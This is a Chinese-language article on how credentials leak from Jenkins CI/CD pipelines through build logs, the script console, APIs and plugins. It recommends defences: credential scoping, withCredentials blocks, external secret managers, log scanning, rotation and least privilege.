Jenkins 凭证泄露代表现代 CI/CD 流水线中的关键安全风险。使 Jenkins 强大的灵活性——Groovy 脚本、广泛的插件、详细的日志记录——也创造了凭证泄漏的众多途径。从明显的错误（如在构建日志中回显密码）到插件 API 中的细微漏洞，攻击面广泛且不断演变。

最常见的泄露向量仍然是构建日志，开发人员在调试期间或通过详细命令输出无意中打印凭证。这些日志默认情况下无限期保留，所有开发人员都可访问，并且经常被转发到日志聚合系统，使泄露倍增。脚本控制台提供管理权力，但也使任何有权访问的人都能直接提取凭证。API 端点可能通过任务配置、构建参数和插件特定的漏洞暴露凭证。

常见的泄露情境展示了凭证保护不足的严重后果。具有默认安全设置的公开可访问 Jenkins 实例可能导致完全的基础设施入侵。长期包含凭证的构建日志使组织面临需要大量审计的未知风险。插件漏洞可能影响数千个安装，许多组织由于兼容性问题而延迟应用补丁。

保护需要多层防御。安全流水线实践通过谨慎使用 `withCredentials` 块、禁用命令回显和避免凭证打印来最小化凭证泄露。凭证范围通过限制哪些任务可以访问特定凭证来限制爆炸半径。严格的访问控制和全面的审计日志记录能够检测可疑活动。像 HashiCorp Vault 这样的外部机密管理系统提供动态、短期凭证和集中控制，但它们不能消除通过日志、artifact 或报告的泄露——无论机密存储在哪里，安全流水线设计仍然至关重要。

检测和响应能力同样关键。自动扫描构建日志和配置可以在攻击者发现之前识别暴露的凭证。明确的事件响应程序确保快速轮换被入侵的凭证，并彻底调查潜在的未经授权访问。定期对 Jenkins 配置、插件和流水线进行安全审计有助于在漏洞被利用之前识别它们。

「安全即代码」和基础设施自动化的趋势使 Jenkins 安全性变得越来越重要。随着组织将更多凭证整合到 CI/CD 系统中，泄露的影响也在增长。最小权限原则应该指导每个凭证决策：使用文件夹范围的凭证，为每个用例创建单独的凭证，优先使用只读访问，并定期轮换。

在 Jenkins 中存储凭证之前，问问自己：这个凭证需要在 Jenkins 中吗，还是可以从外部机密管理器检索？谁需要访问这个凭证，我可以更狭窄地限定范围吗？如果这个凭证被暴露，我将如何检测？我的轮换策略是什么？这些问题的答案应该指导你的凭证管理策略，并帮助防止 CI/CD 流水线中的下一次凭证泄露事件。
